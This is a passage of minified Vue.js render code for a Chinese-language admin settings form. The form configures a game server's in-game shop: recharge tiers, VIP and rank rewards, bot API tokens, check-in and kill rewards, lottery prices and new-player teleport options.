i("div",{key:a,staticStyle:{width:"100%","line-height":"40px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"},style:{marginTop:0!==a?"10px":""}},[i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("分类标记:")]),i("a-input",{staticStyle:{width:"calc(100% - 200px)"},attrs:{disabled:!e.edit,placeholder:"请输入分类标记(不能重复)"},model:{value:t.typeGroup,callback:function(i){e.$set(t,"typeGroup",i)},expression:"AdvancedUserChargeConfig.typeGroup"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.AdvancedUserChargeConfigs.splice(a,1)}}},[e._v("移除")])],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("描述:")]),i("a-input",{staticStyle:{width:"calc(100% - 130px)"},attrs:{disabled:!e.edit},model:{value:t.desc,callback:function(i){e.$set(t,"desc",i)},expression:"AdvancedUserChargeConfig.desc"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("价格（人民币）:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 130px)"},attrs:{min:0,disabled:!e.edit},model:{value:t.price,callback:function(i){e.$set(t,"price",i)},expression:"AdvancedUserChargeConfig.price"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("兑换美金:")]),i("a-checkbox",{attrs:{disabled:!e.edit},on:{change:function(){e.$set(t,"dollar",null)}},model:{value:t.check.dollar,callback:function(i){e.$set(t.check,"dollar",i)},expression:"AdvancedUserChargeConfig.check.dollar"}})],1),!0===t.check.dollar?[i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("美金金额:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 130px)"},attrs:{min:0,disabled:!e.edit},model:{value:t.dollar,callback:function(i){e.$set(t,"dollar",i)},expression:"AdvancedUserChargeConfig.dollar"}})],1)]:e._e(),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("兑换VIP等级:")]),i("a-checkbox",{attrs:{disabled:!e.edit},on:{change:function(i){e.$set(t,"vip",!0===i?{level:null,levelExpireDays:0}:{})}},model:{value:t.check.vip,callback:function(i){e.$set(t.check,"vip",i)},expression:"AdvancedUserChargeConfig.check.vip"}})],1),!0===t.check.vip?[i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("会员等级:")]),i("a-select",{staticStyle:{width:"calc(100% - 130px)"},attrs:{disabled:!e.edit},model:{value:t.vip.level,callback:function(i){e.$set(t.vip,"level",i)},expression:"AdvancedUserChargeConfig.vip.level"}},e._l(e.levelList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1)],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("会员有效天数:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 130px)"},attrs:{min:0,disabled:!e.edit},model:{value:t.vip.levelExpireDays,callback:function(i){e.$set(t.vip,"levelExpireDays",i)},expression:"AdvancedUserChargeConfig.vip.levelExpireDays"}})],1)]:e._e(),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("兑换军衔:")]),i("a-checkbox",{attrs:{disabled:!e.edit},on:{change:function(i){e.$set(t,"military",!0===i?{militaryLevelId:null,militaryLevelExpireDays:0}:{})}},model:{value:t.check.military,callback:function(i){e.$set(t.check,"military",i)},expression:"AdvancedUserChargeConfig.check.military"}})],1),!0===t.check.military?[i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("军衔等级:")]),i("a-select",{staticStyle:{width:"calc(100% - 130px)"},attrs:{disabled:!e.edit},model:{value:t.military.militaryLevelId,callback:function(i){e.$set(t.military,"militaryLevelId",i)},expression:"AdvancedUserChargeConfig.military.militaryLevelId"}},e._l(e.militaryLevelList,(function(t){return i("a-select-option",{key:t.levelId,attrs:{title:t.level}},[e._v(e._s(t.level))])})),1)],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("军衔有效天数:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 130px)"},attrs:{min:0,disabled:!e.edit},model:{value:t.military.militaryLevelExpireDays,callback:function(i){e.$set(t.military,"militaryLevelExpireDays",i)},expression:"AdvancedUserChargeConfig.military.militaryLevelExpireDays"}})],1)]:e._e(),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("兑换套餐:")]),i("a-checkbox",{attrs:{disabled:!e.edit},on:{change:function(){e.$set(t,"sets",[])}},model:{value:t.check.sets,callback:function(i){e.$set(t.check,"sets",i)},expression:"AdvancedUserChargeConfig.check.sets"}})],1),!0===t.check.sets?i("div",{staticStyle:{width:"100%","margin-top":"5px","margin-bottom":"5px"}},[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("套餐列表:")]),i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){t.sets.push({itemId:null,itemName:"",number:null,itemList:[]})}}},[e._v("添加 ")]),e._l(t.sets,(function(a,n){return i("div",{key:n,staticStyle:{width:"100%","padding-left":"140px"}},[i("a-select",{staticStyle:{width:"150px"},attrs:{disabled:!e.edit,placeholder:"模糊搜索(商品名称，仅限套餐)","allow-clear":"","show-search":"","filter-option":!1},on:{search:function(t){return e.handleSearchSetItemName(t,a)},change:function(t){e.$set(a,"itemName",t?a.itemList[0].name:"")}},model:{value:a.itemId,callback:function(t){e.$set(a,"itemId",t)},expression:"set.itemId"}},e._l(a.itemList,(function(t){return i("a-select-option",{key:t.id,attrs:{label:t.name}},[e._v(e._s(t.name))])})),1),i("a-input-number",{staticStyle:{width:"120px","margin-left":"5px"},attrs:{min:0,placeholder:"套餐数量",disabled:!e.edit},model:{value:a.number,callback:function(t){e.$set(a,"number",t)},expression:"set.number"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){t.sets.splice(n,1)}}},[e._v("移除")])],1)}))],2):e._e()],2)})),0):e._e()],1)]),i("div",{staticStyle:{height:"1px",width:"100%",background:"#CCCCCC","margin-bottom":"10px"}}),i("a-form-model-item",{attrs:{label:"开启内置模式",prop:"EnableInnerMode"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableInnerMode,callback:function(t){e.$set(e.settingsForm,"EnableInnerMode",t)},expression:"settingsForm.EnableInnerMode"}})],1),i("a-form-model-item",{attrs:{label:"内置模式简易注册",prop:"EnableInnerModeSimpleSignup"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableInnerModeSimpleSignup,callback:function(t){e.$set(e.settingsForm,"EnableInnerModeSimpleSignup",t)},expression:"settingsForm.EnableInnerModeSimpleSignup"}})],1),i("a-form-model-item",{attrs:{label:"内置商城功能设置",prop:"InnerModeConfigs"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.InnerModeConfigs.push({function:"",enable:!0,keywordEn:"@example",keywordCn:"@示例"})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.InnerModeConfigs?"up":"down"},on:{click:function(){e.$set(e.expander,"InnerModeConfigs",!e.expander.InnerModeConfigs)}}},[e._v(e._s(e.expander.InnerModeConfigs?"隐藏":"显示"))]),void 0!==e.settingsForm.InnerModeConfigs&&e.settingsForm.InnerModeConfigs.length&&e.expander.InnerModeConfigs?i("div",{staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},e._l(e.settingsForm.InnerModeConfigs,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","line-height":"40px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"},style:{marginTop:0!==a?"10px":""}},[i("div",[i("span",{staticStyle:{display:"inline-block",width:"90px","text-align":"right","padding-right":"10px"}},[e._v("功能:")]),i("a-select",{staticStyle:{width:"calc((100% - 180px) / 2)"},attrs:{disabled:!e.edit,placeholder:"功能"},model:{value:t.function,callback:function(i){e.$set(t,"function",i)},expression:"InnerModeConfig.function"}},e._l(e.innerModeFuctionList,(function(t){return i("a-select-option",{key:t.function,attrs:{disabled:-1!==e.settingsForm.InnerModeConfigs.findIndex((function(e){return e.function===t.function})),value:t.function}},[e._v(e._s(t.cnFunction))])})),1),i("span",{staticStyle:{display:"inline-block",width:"90px","text-align":"right","padding-right":"10px"}},[e._v("是否启用:")]),i("a-switch",{attrs:{disabled:!e.edit},model:{value:t.enable,callback:function(i){e.$set(t,"enable",i)},expression:"InnerModeConfig.enable"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.InnerModeConfigs.splice(a,1)}}},[e._v("移除")])],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"90px","text-align":"right","padding-right":"10px"}},[e._v("前缀(中文):")]),i("a-input",{staticStyle:{width:"calc((100% - 180px) / 2)"},attrs:{disabled:!e.edit,placeholder:"请输入名称(不能重复)"},model:{value:t.keywordCn,callback:function(i){e.$set(t,"keywordCn",i)},expression:"InnerModeConfig.keywordCn"}}),i("span",{staticStyle:{display:"inline-block",width:"90px","text-align":"right","padding-right":"10px"}},[e._v("前缀(英语):")]),i("a-input",{staticStyle:{width:"calc((100% - 180px) / 2)"},attrs:{disabled:!e.edit,placeholder:"请输入名称(不能重复)"},model:{value:t.keywordEn,callback:function(i){e.$set(t,"keywordEn",i)},expression:"InnerModeConfig.keywordEn"}})],1),void 0!==e.innerModeFuctionList.find((function(e){return e.function===t.function}))&&t.keywordCn.length?i("div",{staticStyle:{"line-height":"25px","font-size":"12px","font-weight":"bolder"},domProps:{innerHTML:e._s(e.innerModeFuctionList.find((function(e){return e.function===t.function})).example.replace(/{text}/g,t.keywordCn))}}):e._e()])})),0):e._e()],1)]),i("a-form-model-item",{attrs:{label:"内置商城快捷指令",prop:"InnerModeShortCutConfigs"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.InnerModeShortCutConfigs.push({enable:!0,shortcut:"",original:""})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.InnerModeShortCutConfigs?"up":"down"},on:{click:function(){e.$set(e.expander,"InnerModeShortCutConfigs",!e.expander.InnerModeShortCutConfigs)}}},[e._v(e._s(e.expander.InnerModeShortCutConfigs?"隐藏":"显示"))])],1),e.expander.InnerModeShortCutConfigs?e._l(e.settingsForm.InnerModeShortCutConfigs,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("启用:")]),i("a-switch",{attrs:{disabled:!e.edit},model:{value:t.enable,callback:function(i){e.$set(t,"enable",i)},expression:"object.enable"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.InnerModeShortCutConfigs.splice(a,1)}}},[e._v("移除")])],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[i("span",[e._v("快捷方式")]),i("a-tooltip",{attrs:{placement:"left",title:"例如：'@传送到炼体区'"}},[i("a-icon",{staticStyle:{"margin-left":"5px",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1),i("span",[e._v(":")])],1),i("a-input",{staticStyle:{width:"calc(100% - 100px)"},attrs:{disabled:!e.edit},model:{value:t.shortcut,callback:function(i){e.$set(t,"shortcut",i)},expression:"object.shortcut"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[i("span",[e._v("源指令")]),i("a-tooltip",{attrs:{placement:"left",title:"例如：'@购买商品 炼体区传送 1'"}},[i("a-icon",{staticStyle:{"margin-left":"5px",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1),i("span",[e._v(":")])],1),i("a-input",{staticStyle:{width:"calc(100% - 100px)"},attrs:{disabled:!e.edit},model:{value:t.original,callback:function(i){e.$set(t,"original",i)},expression:"object.original"}})],1)])})):e._e()],2),i("a-form-model-item",{attrs:{label:"内置商城自定义问答",prop:"InnerModeDiyFaqConfigs"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.InnerModeDiyFaqConfigs.push({enable:!0,ask:"",answers:[""]})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.InnerModeDiyFaqConfigs?"up":"down"},on:{click:function(){e.$set(e.expander,"InnerModeDiyFaqConfigs",!e.expander.InnerModeDiyFaqConfigs)}}},[e._v(e._s(e.expander.InnerModeDiyFaqConfigs?"隐藏":"显示"))])],1),e.expander.InnerModeDiyFaqConfigs?e._l(e.settingsForm.InnerModeDiyFaqConfigs,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("启用:")]),i("a-switch",{attrs:{disabled:!e.edit},model:{value:t.enable,callback:function(i){e.$set(t,"enable",i)},expression:"object.enable"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.InnerModeDiyFaqConfigs.splice(a,1)}}},[e._v("移除")])],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[i("span",[e._v("问题")]),i("a-tooltip",{attrs:{placement:"left",title:"例如：'服主多少岁'"}},[i("a-icon",{staticStyle:{"margin-left":"5px",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1),i("span",[e._v(":")])],1),i("a-input",{staticStyle:{width:"calc(100% - 100px)"},attrs:{disabled:!e.edit},model:{value:t.ask,callback:function(i){e.$set(t,"ask",i)},expression:"object.ask"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[i("span",[e._v("答案")]),i("a-tooltip",{attrs:{placement:"left",title:"例如：'服主还没出生'"}},[i("a-icon",{staticStyle:{"margin-left":"5px",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1),i("span",[e._v(":")])],1),i("a-button",{staticStyle:{float:"right",transform:"translateY(8px)"},attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){t.answers.push("")}}},[e._v("添加")])],1),e._l(t.answers,(function(a,n){return i("div",{key:n,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("a-input",{staticStyle:{width:"calc(100% - 80px)"},attrs:{disabled:!e.edit},model:{value:t.answers[n],callback:function(i){e.$set(t.answers,n,i)},expression:"object.answers[index1]"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit||t.answers.length<=1,icon:"delete",type:"danger",size:"small"},on:{click:function(){t.answers.splice(n,1)}}},[e._v("移除")])],1)}))],2)})):e._e()],2),i("div",{staticStyle:{height:"1px",width:"100%",background:"#CCCCCC","margin-bottom":"10px"}}),i("a-form-model-item",{attrs:{prop:"ThirdPartyRobotUidConfigs"}},[i("template",{slot:"label"},[i("span",[e._v("第三方对用户的身份映射")]),i("a-tooltip",{attrs:{placement:"top",title:"请根据各第三方机器人接入商提供的元数据填写。欢迎各位开发者编写接入商城开放API的各社交平台的群应用/群机器人，API接入文档请咨询髓扬帝"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.ThirdPartyRobotUidConfigs.push({key:"",type:"string"})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.ThirdPartyRobotUidConfigs?"up":"down"},on:{click:function(){e.$set(e.expander,"ThirdPartyRobotUidConfigs",!e.expander.ThirdPartyRobotUidConfigs)}}},[e._v(e._s(e.expander.ThirdPartyRobotUidConfigs?"隐藏":"显示"))])],1),void 0!==e.settingsForm.ThirdPartyRobotUidConfigs&&e.settingsForm.ThirdPartyRobotUidConfigs.length&&e.expander.ThirdPartyRobotUidConfigs?i("div",{staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},e._l(e.settingsForm.ThirdPartyRobotUidConfigs,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","line-height":"40px"}},[i("div",[i("span",{staticStyle:{display:"inline-block",width:"40px","text-align":"right","padding-right":"10px"}},[e._v("KEY:")]),i("a-input",{staticStyle:{width:"calc((100% - 200px) / 2)"},attrs:{disabled:!e.edit,placeholder:"请输入名称(不能重复)"},model:{value:t.key,callback:function(i){e.$set(t,"key",i)},expression:"ThirdPartyRobotUidConfig.key"}}),i("span",{staticStyle:{display:"inline-block",width:"80px","text-align":"right","padding-right":"10px"}},[e._v("数据类型:")]),i("a-select",{staticStyle:{width:"calc((100% - 200px) / 2)"},attrs:{disabled:!e.edit,placeholder:"数据类型"},model:{value:t.type,callback:function(i){e.$set(t,"type",i)},expression:"ThirdPartyRobotUidConfig.type"}},[i("a-select-option",{key:"string",attrs:{value:"string"}},[e._v("文字")]),i("a-select-option",{key:"number",attrs:{value:"number"}},[e._v("数字")])],1),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.ThirdPartyRobotUidConfigs.splice(a,1)}}},[e._v("移除")])],1)])})),0):e._e()],2),i("a-form-model-item",{attrs:{prop:"ThirdPartyRobotAuthConfigs"}},[i("template",{slot:"label"},[i("span",[e._v("第三方鉴权token")]),i("a-tooltip",{attrs:{placement:"top",title:"第三方机器人访问OpenAPI时使用的凭据。欢迎各位开发者编写接入商城开放API的各社交平台的群应用/群机器人，API接入文档请咨询髓扬帝"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-input",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.ThirdPartyRobotAuthConfigs,callback:function(t){e.$set(e.settingsForm,"ThirdPartyRobotAuthConfigs",t)},expression:"settingsForm.ThirdPartyRobotAuthConfigs"}})],2),i("div",{staticStyle:{height:"1px",width:"100%",background:"#CCCCCC","margin-bottom":"10px"}}),i("a-form-model-item",{attrs:{label:"商城每日签到奖励",prop:"UserCheckInPrize"}},[i("a-input-number",{attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.UserCheckInPrize,callback:function(t){e.$set(e.settingsForm,"UserCheckInPrize",t)},expression:"settingsForm.UserCheckInPrize"}})],1),i("a-form-model-item",{attrs:{label:"每1声望兑换所需美金",prop:"FamesPrice"}},[i("a-input-number",{attrs:{disabled:!e.edit,min:0},model:{value:e.settingsForm.FamesPrice,callback:function(t){e.$set(e.settingsForm,"FamesPrice",t)},expression:"settingsForm.FamesPrice"}})],1),i("a-form-model-item",{attrs:{label:"转账手续费(%)",prop:"TransitionFeePercent"}},[i("a-input-number",{attrs:{disabled:!e.edit,min:0,max:100},model:{value:e.settingsForm.TransitionFeePercent,callback:function(t){e.$set(e.settingsForm,"TransitionFeePercent",t)},expression:"settingsForm.TransitionFeePercent"}})],1),i("a-form-model-item",{attrs:{label:"击杀/登录奖励结算",prop:"EnableKill2LoginDollars"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableKill2LoginDollars,callback:function(t){e.$set(e.settingsForm,"EnableKill2LoginDollars",t)},expression:"settingsForm.EnableKill2LoginDollars"}})],1),i("a-form-model-item",{attrs:{label:"月卡领取冷却时间计算方式",prop:"LoginSetClaimCDType"}},[i("a-select",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.LoginSetClaimCDType,callback:function(t){e.$set(e.settingsForm,"LoginSetClaimCDType",t)},expression:"settingsForm.LoginSetClaimCDType"}},[i("a-select-option",{key:"24h"},[e._v("间隔24小时")]),i("a-select-option",{key:"0am"},[e._v("次日零时")])],1)],1),i("a-form-model-item",{attrs:{label:"签到冷却时间计算方式",prop:"CheckInCDType"}},[i("a-select",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.CheckInCDType,callback:function(t){e.$set(e.settingsForm,"CheckInCDType",t)},expression:"settingsForm.CheckInCDType"}},[i("a-select-option",{key:"24h"},[e._v("间隔24小时")]),i("a-select-option",{key:"0am"},[e._v("次日零时")])],1)],1),i("a-form-model-item",{attrs:{label:"滴滴车冷却时间计算方式",prop:"DiDiVehicleCDType"}},[i("a-select",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.DiDiVehicleCDType,callback:function(t){e.$set(e.settingsForm,"DiDiVehicleCDType",t)},expression:"settingsForm.DiDiVehicleCDType"}},[i("a-select-option",{key:"24h"},[e._v("间隔24小时")]),i("a-select-option",{key:"0am"},[e._v("次日零时")])],1)],1),i("a-form-model-item",{attrs:{prop:"KillerReward"}},[i("template",{slot:"label"},[i("span",[e._v("击杀奖励")]),i("a-tooltip",{attrs:{placement:"top",title:"击杀奖励/被击杀惩罚任一为零将导致美金奖惩不进行"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-input-number",{attrs:{min:0,disabled:!e.edit},model:{value:e.settingsForm.KillerReward,callback:function(t){e.$set(e.settingsForm,"KillerReward",t)},expression:"settingsForm.KillerReward"}})],2),i("a-form-model-item",{attrs:{prop:"VictimPunishment"}},[i("template",{slot:"label"},[i("span",[e._v("被击杀惩罚")]),i("a-tooltip",{attrs:{placement:"top",title:"击杀奖励/被击杀惩罚任一为零将导致美金奖惩不进行"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-input-number",{attrs:{min:0,disabled:!e.edit},model:{value:e.settingsForm.VictimPunishment,callback:function(t){e.$set(e.settingsForm,"VictimPunishment",t)},expression:"settingsForm.VictimPunishment"}})],2),i("a-form-model-item",{attrs:{label:"安全区击杀惩罚",prop:"EnableSafeZoneKillPunish"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableSafeZoneKillPunish,callback:function(t){e.$set(e.settingsForm,"EnableSafeZoneKillPunish",t)},expression:"settingsForm.EnableSafeZoneKillPunish"}})],1),i("a-form-model-item",{attrs:{label:"安全区击杀惩罚类型",prop:"SafeAreaKillPunishmentMode"}},[i("a-select",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.SafeAreaKillPunishmentMode,callback:function(t){e.$set(e.settingsForm,"SafeAreaKillPunishmentMode",t)},expression:"settingsForm.SafeAreaKillPunishmentMode"}},[i("a-select-option",{key:0},[e._v("甩到半空中摔死")]),i("a-select-option",{key:1},[e._v('立即踢出服务器(#Kick "Steam ID")')]),i("a-select-option",{key:2},[e._v('立即Ban出服务器(#Ban "Steam ID")')])],1)],1),i("a-form-model-item",{attrs:{label:"最小登录奖励时间(分钟)",prop:"MinRewardOnlineTime"}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit},model:{value:e.settingsForm.MinRewardOnlineTime,callback:function(t){e.$set(e.settingsForm,"MinRewardOnlineTime",t)},expression:"settingsForm.MinRewardOnlineTime"}})],1),i("a-form-model-item",{attrs:{label:"在线奖励(每分钟)",prop:"OnlineRewardPerMinute"}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit},model:{value:e.settingsForm.OnlineRewardPerMinute,callback:function(t){e.$set(e.settingsForm,"OnlineRewardPerMinute",t)},expression:"settingsForm.OnlineRewardPerMinute"}})],1),i("a-form-model-item",{attrs:{prop:"MaxOnlineReward"}},[i("template",{slot:"label"},[i("span",[e._v("每日在线奖励上限")]),i("a-tooltip",{attrs:{placement:"top",title:"若为0则不启用"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-input-number",{attrs:{min:0,disabled:!e.edit},model:{value:e.settingsForm.MaxOnlineReward,callback:function(t){e.$set(e.settingsForm,"MaxOnlineReward",t)},expression:"settingsForm.MaxOnlineReward"}})],2),i("a-form-model-item",{attrs:{label:"开启注册商城自动送美金",prop:"EnableSignupAutoDollars"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableSignupAutoDollars,callback:function(t){e.$set(e.settingsForm,"EnableSignupAutoDollars",t)},expression:"settingsForm.EnableSignupAutoDollars"}})],1),i("a-form-model-item",{attrs:{label:"注册商城自动送的美金数量",prop:"SignupAutoDollars"}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit||!0!==e.settingsForm.EnableSignupAutoDollars},model:{value:e.settingsForm.SignupAutoDollars,callback:function(t){e.$set(e.settingsForm,"SignupAutoDollars",t)},expression:"settingsForm.SignupAutoDollars"}})],1),i("a-form-model-item",{attrs:{label:"抽奖所需美金",prop:"GetPrizePrice"}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit},model:{value:e.settingsForm.GetPrizePrice,callback:function(t){e.$set(e.settingsForm,"GetPrizePrice",t)},expression:"settingsForm.GetPrizePrice"}})],1),i("a-form-model-item",{attrs:{label:"美金十连抽(单次)所需美金",prop:"GetPrizePrice10"}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit},model:{value:e.settingsForm.GetPrizePrice10,callback:function(t){e.$set(e.settingsForm,"GetPrizePrice10",t)},expression:"settingsForm.GetPrizePrice10"}})],1),i("a-form-model-item",{attrs:{label:"每行消息所需美金",prop:"MessagePricePerLine"}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit},model:{value:e.settingsForm.MessagePricePerLine,callback:function(t){e.$set(e.settingsForm,"MessagePricePerLine",t)},expression:"settingsForm.MessagePricePerLine"}})],1),i("a-form-model-item",{attrs:{label:"小队最大人数",prop:"TeamMaxMembers"}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit},model:{value:e.settingsForm.TeamMaxMembers,callback:function(t){e.$set(e.settingsForm,"TeamMaxMembers",t)},expression:"settingsForm.TeamMaxMembers"}})],1),i("a-form-model-item",{attrs:{label:"开启游戏美金转商城美金",prop:"EnableTransferGameDollarToStoreDollar"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableTransferGameDollarToStoreDollar,callback:function(t){e.$set(e.settingsForm,"EnableTransferGameDollarToStoreDollar",t)},expression:"settingsForm.EnableTransferGameDollarToStoreDollar"}})],1),i("a-form-model-item",{attrs:{label:"游戏转商城美金收款银行卡号",prop:"TransferGameDollarToStoreDollarAccountID"}},[i("a-input",{attrs:{disabled:!e.edit||!0!==e.settingsForm.EnableTransferGameDollarToStoreDollar},model:{value:e.settingsForm.TransferGameDollarToStoreDollarAccountID,callback:function(t){e.$set(e.settingsForm,"TransferGameDollarToStoreDollarAccountID",t)},expression:"settingsForm.TransferGameDollarToStoreDollarAccountID"}})],1),i("a-form-model-item",{attrs:{label:"1游戏美金可兑换的商城美金",prop:"TransferGameDollarToStoreDollarPercent"}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit||!0!==e.settingsForm.EnableTransferGameDollarToStoreDollar},model:{value:e.settingsForm.TransferGameDollarToStoreDollarPercent,callback:function(t){e.$set(e.settingsForm,"TransferGameDollarToStoreDollarPercent",t)},expression:"settingsForm.TransferGameDollarToStoreDollarPercent"}})],1),i("a-form-model-item",{attrs:{label:"启用新手玩家进服欢迎",prop:"EnableStarterPlayerWelcome"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableStarterPlayerWelcome,callback:function(t){e.$set(e.settingsForm,"EnableStarterPlayerWelcome",t)},expression:"settingsForm.EnableStarterPlayerWelcome"}})],1),i("a-form-model-item",{attrs:{label:"启用把新玩家拉到指定地点",prop:"EnableTeleportStarterPlayerToTargetPlace"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableTeleportStarterPlayerToTargetPlace,callback:function(t){e.$set(e.settingsForm,"EnableTeleportStarterPlayerToTargetPlace",t)},expression:"settingsForm.EnableTeleportStarterPlayerToTargetPlace"}})],1),i("a-form-model-item",{attrs:{label:"新玩家拉到指定地点的坐标",prop:"TeleportStarterPlayerToTargetPlaceLocation"}},[i("a-input",{attrs:{disabled:!e.edit||!0!==e.settingsForm.EnableTeleportStarterPlayerToTargetPlace},model:{value:e.settingsForm.TeleportStarterP